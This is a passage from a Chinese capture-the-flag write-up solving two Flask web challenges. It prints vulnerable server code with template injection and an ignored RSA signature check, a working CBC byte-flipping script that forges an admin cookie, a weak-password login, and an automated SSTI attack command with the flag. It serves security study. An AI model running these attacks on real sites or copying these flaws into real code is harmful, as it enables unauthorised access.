class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % (</span><br><span class="line">            current_username,</span><br><span class="line">            payload,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        html_template = (</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Home&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h2 class=&quot;text-center&quot;&gt;server code (encoded)&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot; style=&quot;word-break:break-all;&quot;&gt;</span></span><br><span class="line"><span class="string">        &#123;%% raw %%&#125;</span></span><br><span class="line"><span class="string">            %s</span></span><br><span class="line"><span class="string">        &#123;%% endraw %%&#125;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">            % base64.b64encode(<span class="built_in">open</span>(__file__, <span class="string">&quot;rb&quot;</span>).read()).decode()</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    resp = redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    resp.delete_cookie(<span class="string">&quot;jwbcookie&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>思路很明确，伪造<code>admin</code>，因为现在<strong>字节翻转攻击</strong>前人的研究都挺多了的，我们直接拷打<code>ChatGPT</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">BLOCK_SIZE = <span class="number">16</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flip_bytes</span>(<span class="params">cookie_b: <span class="built_in">bytes</span>, offset: <span class="built_in">int</span>, orig: <span class="built_in">bytes</span>, target: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    对 cookie 中位于指定 offset 处的前一块（IV 或上一块密文）进行字节修改，</span></span><br><span class="line"><span class="string">    修改公式：new_byte = old_byte XOR (orig_byte XOR target_byte)</span></span><br><span class="line"><span class="string">    orig 和 target 必须长度相同。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(orig) != <span class="built_in">len</span>(target):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;原始用户名和目标用户名长度必须一致！&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># cookie_b = IV || C1 || C2 || ...  按 16 字节为一块</span></span><br><span class="line">    <span class="comment"># 计算需要修改的块索引以及在块内的位置</span></span><br><span class="line">    block_index = offset // BLOCK_SIZE</span><br><span class="line">    byte_index = offset % BLOCK_SIZE</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果 block_index==0 ，则修改 IV；否则修改前一个密文块</span></span><br><span class="line">    <span class="keyword">if</span> block_index == <span class="number">0</span>:</span><br><span class="line">        mod_block_start = <span class="number">0</span>  <span class="comment"># IV 就在前 16 字节</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        mod_block_start = block_index * BLOCK_SIZE - BLOCK_SIZE</span><br><span class="line"></span><br><span class="line">    mod_block = <span class="built_in">bytearray</span>(</span><br><span class="line">        cookie_b[mod_block_start: mod_block_start + BLOCK_SIZE])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对需要修改的部分依次进行位翻转</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(orig)):</span><br><span class="line">        pos_in_block = byte_index + i</span><br><span class="line">        <span class="keyword">if</span> pos_in_block &gt;= BLOCK_SIZE:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;用户名跨越块边界，本脚本目前只支持单个块内部修改！&quot;</span>)</span><br><span class="line">        <span class="comment"># 原先密文中前一块的对应字节 old_byte</span></span><br><span class="line">        old_byte = mod_block[pos_in_block]</span><br><span class="line">        <span class="comment"># 计算差异</span></span><br><span class="line">        diff = orig[i] ^ target[i]</span><br><span class="line">        mod_block[pos_in_block] = old_byte ^ diff</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将修改后的块写回到 cookie_b 中</span></span><br><span class="line">    cookie_b = <span class="built_in">bytearray</span>(cookie_b)</span><br><span class="line">    cookie_b[mod_block_start: mod_block_start + BLOCK_SIZE] = mod_block</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(cookie_b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_username_offset</span>(<span class="params">plaintext: <span class="built_in">str</span>, username: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    计算 username 在 plaintext 中的偏移量。</span></span><br><span class="line"><span class="string">    plaintext 通常是生成 cookie 时的 JSON 字符串</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pos = plaintext.find(username)</span><br><span class="line">    <span class="keyword">if</span> pos == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;未在预估的明文中找到用户名字符串!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> pos</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simulate_plaintext</span>(<span class="params">orig_username: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    构造一个与服务端 JSON 序列化结果格式类似的字符串，</span></span><br><span class="line"><span class="string">    仅用于推断用户名所在偏移位置。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 注意：实际的 register_time 和 password_raw 无关紧要，此处只需保证结构格式与实际一致</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: orig_username,</span><br><span class="line">        <span class="string">&quot;password_raw&quot;</span>: <span class="string">&quot;dummy&quot;</span>,</span><br><span class="line">        <span class="string">&quot;register_time&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> json.dumps(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;用法: &#123;&#125; &lt;cookie_base64&gt; &lt;orig_username&gt; &lt;target_username&gt;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            sys.argv[<span class="number">0</span>]))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;例如: &#123;&#125; &lt;cookie_str&gt; aaaaa admin&quot;</span>.<span class="built_in">format</span>(sys.argv[<span class="number">0</span>]))</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    cookie_base64 = sys.argv[<span class="number">1</span>]</span><br><span class="line">    orig_username = sys.argv[<span class="number">2</span>].encode()</span><br><span class="line">    target_username = sys.argv[<span class="number">3</span>].encode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(orig_username) != <span class="built_in">len</span>(target_username):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;原始用户名和目标用户名长度必须一致！&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解码原始 cookie</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie_bytes = base64.b64decode(cookie_base64)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;cookie解码失败: &quot;</span>, e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 模拟生成明文，帮助定位用户名位置</span></span><br><span class="line">    plaintext_sim = simulate_plaintext(orig_username.decode())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        offset = find_username_offset(plaintext_sim, orig_username.decode())</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;推测用户名在明文中的偏移量：&quot;</span>, offset)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 修改 cookie 中对应的前一块数据</span></span><br><span class="line">    cookie_modified = flip_bytes(</span><br><span class="line">        cookie_bytes, offset, orig_username, target_username)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出新的 cookie</span></span><br><span class="line">    new_cookie_base64 = base64.b64encode(cookie_modified).decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;新构造的 cookie：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(new_cookie_base64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>我们要先拿到<code>aaaaa</code>的<code>cookie</code>，貌似这里用户<strong>已经存在</strong>了，我直接用一手<code>123456</code>的弱口令就登进去了<br /><img src="https://picx.zhimg.com/80/v2-7f037ed155981a1710249bc6025d9d52_1440w.png" alt="" /><br />接下来就是<code>SSTI</code>，<strong>fenjing</strong>直接梭</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">GET /home?payload=PAYLOAD HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">61.147</span><span class="number">.171</span><span class="number">.105</span>:<span class="number">63789</span></span><br><span class="line">Referer: http://<span class="number">61.147</span><span class="number">.171</span><span class="number">.105</span>:<span class="number">63789</span>/login</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">135.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Cache-Control: <span class="built_in">max</span>-age=<span class="number">0</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Cookie: jwbcookie=2nRR2vOrnDt+vcwOrbWN3f8SGG1kNMmek6VPEE7iZeu9EI9LY9V+cjXoKdh6r4IvaPCzi3AGKY+tlfr1HdEgjxsy5IANc9hX3VCnN66pvQiCM2xu1aHzHAVzHSYAr2qX</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>python3 -m fenjing crack-request -f http.txt --host “61.147.171.105” --port 63789</strong></p><p><strong>ACTF{n3vEr_imPlem3nT_SuCh_Iv_HIJacK4bl3_C00Kie}</strong></p><p>我这里使用的是<code>wsl2</code>的环境，因为之前试过我的<code>win</code>跑不了。。。</p><h2 id="not-so-web-2"><a class="markdownIt-Anchor" href="#not-so-web-2"></a> not so web 2</h2><blockquote><p>这次用了非对称应该安全了吧</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, json, time</span><br><span class="line"><span class="keyword">import</span> os, sys, binascii</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass, asdict</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> KEY, ADMIN_PASSWORD</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (</span><br><span class="line">    Flask,</span><br><span class="line">    render_template,</span><br><span class="line">    render_template_string,</span><br><span class="line">    request,</span><br><span class="line">    redirect,</span><br><span class="line">    url_for,</span><br><span class="line">    flash,</span><br><span class="line">    session,</span><br><span class="line">    abort,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = KEY</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">&quot;/etc/ssl/nginx/local.key&quot;</span>):</span><br><span class="line">    private_key = RSA.importKey(<span class="built_in">open</span>(<span class="string">&quot;/etc/ssl/nginx/local.key&quot;</span>, <span class="string">&quot;r&quot;</span>).read())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    private_key = RSA.generate(<span class="number">2048</span>)</span><br><span class="line"></span><br><span class="line">public_key = private_key.publickey()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">APPUser</span>:</span><br><span class="line">    name: <span class="built_in">str</span></span><br><span class="line">    password_raw: <span class="built_in">str</span></span><br><span class="line">    register_time: <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  In-memory store for user registration</span></span><br><span class="line">users: <span class="type">Dict</span>[<span class="built_in">str</span>, APPUser] = &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: APPUser(name=<span class="string">&quot;admin&quot;</span>, password_raw=ADMIN_PASSWORD, register_time=-<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_cookie</span>(<span class="params">cookie_b64: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    valid, _ = parse_cookie(cookie_b64)</span><br><span class="line">    <span class="keyword">return</span> valid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_cookie</span>(<span class="params">cookie_b64: <span class="built_in">str</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">bool</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie_b64:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie = base64.b64decode(cookie_b64, validate=<span class="literal">True</span>).decode()</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        msg_str, sig_hex = cookie.split(<span class="string">&quot;&amp;&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    msg_dict = json.loads(msg_str)</span><br><span class="line">    msg_str_bytes = msg_str.encode()</span><br><span class="line">    msg_hash = SHA256.new(msg_str_bytes)</span><br><span class="line">    sig = <span class="built_in">bytes</span>.fromhex(sig_hex)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        PKCS1_v1_5.new(public_key).verify(msg_hash, sig)</span><br><span class="line">        valid = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> (ValueError, TypeError):</span><br><span class="line">        valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> valid, msg_dict.get(<span class="string">&quot;user_name&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_cookie</span>(<span class="params">user: APPUser</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    msg_dict = &#123;<span class="string">&quot;user_name&quot;</span>: user.name, <span class="string">&quot;login_time&quot;</span>: <span class="built_in">int</span>(time.time())&#125;</span><br><span class="line">    msg_str = json.dumps(msg_dict)</span><br><span class="line">    msg_str_bytes = msg_str.encode()</span><br><span class="line">    msg_hash = SHA256.new(msg_str_bytes)</span><br><span class="line">    sig = PKCS1_v1_5.new(private_key).sign(msg_hash)</span><br><span class="line">    sig_hex = sig.<span class="built_in">hex</span>()</span><br><span class="line">    packed = msg_str + <span class="string">&quot;&amp;&quot;</span> + sig_hex</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(packed.encode()).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> validate_cookie(request.cookies.get(<span class="string">&quot;jwbcookie&quot;</span>)):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;home&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        user_name = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> user_name <span class="keyword">in</span> users:</span><br><span class="line">            flash(<span class="string">&quot;Username already exists!&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[user_name] = APPUser(</span><br><span class="line">                name=user_name, password_raw=password, register_time=<span class="built_in">int</span>(time.time())</span><br><span class="line">            )</span><br><span class="line">            flash(<span class="string">&quot;Registration successful! Please login.&quot;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username].password_raw == password:</span><br><span class="line">            resp = redirect(url_for(<span class="string">&quot;home&quot;</span>))</span><br><span class="line">            resp.set_cookie(<span class="string">&quot;jwbcookie&quot;</span>, generate_cookie(users[username]))</span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&quot;Invalid credentials. Please try again.&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/home&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    valid, current_username = parse_cookie(request.cookies.get(<span class="string">&quot;jwbcookie&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid <span class="keyword">or</span> <span class="keyword">not</span> current_username:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;logout&quot;</span>))</span><br><span class="line"></span><br><span class="line">    user_profile = users.get(current_username)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_profile:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;logout&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        payload = request.args.get(<span class="string">&quot;payload&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> payload:</span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">if</span> char <span class="keyword">in</span> <span class="string">&quot;&#x27;_#&amp;;&quot;</span>:</span><br><span class="line">                    abort(<span class="number">403</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        html_template = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Home&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h2 class=&quot;text-center&quot;&gt;Welcome, %s !&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            Your payload: %s</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;img src=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;interesting.jpeg&#x27;) &#125;&#125;&quot; alt=&quot;Embedded Image&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % (</span><br><span class="line">            current_username,</span><br><span class="line">            payload,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        html_template = (</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Home&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h2 class=&quot;text-center&quot;&gt;server code (encoded)&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot; style=&quot;word-break:break-all;&quot;&gt;</span></span><br><span class="line"><span class="string">        &#123;%% raw %%&#125;</span></span><br><span class="line"><span class="string">            %s</span></span><br><span class="line"><span class="string">        &#123;%% endraw %%&#125;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">            % base64.b64encode(<span class="built_in">open</span>(__file__, <span class="string">&quot;rb&quot;</span>).read()).decode()</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    resp = redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    resp.delete_cookie(<span class="string">&quot;jwbcookie&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>这回使用了<code>RSA</code>，本以为会十分的棘手，结果赛后看了师傅们的<code>wp</code>才知道，这题都直接送分了。。。</p><p>注意关键函数<code>parse_cookie()</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    PKCS1_v1_5.new(public_key).verify(msg_hash, sig)</span><br><span class="line">    valid = <span class="literal">True</span></span><br><span class="line"><span class="keyword">except</span> (ValueError, TypeError):</span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line"><span class="keyword">return</span> valid, msg_dict.get(<span class="string">&quot;user_name&quot;</span>)</span><br></pre></td></tr></table></figure><p>这题与1最大的不同就是使用了<strong>PKCS#1_v1.5签名算法</strong>，但是这里并不需要让<code>PKCS1_v1_5.new(public_key).verify(msg_hash, 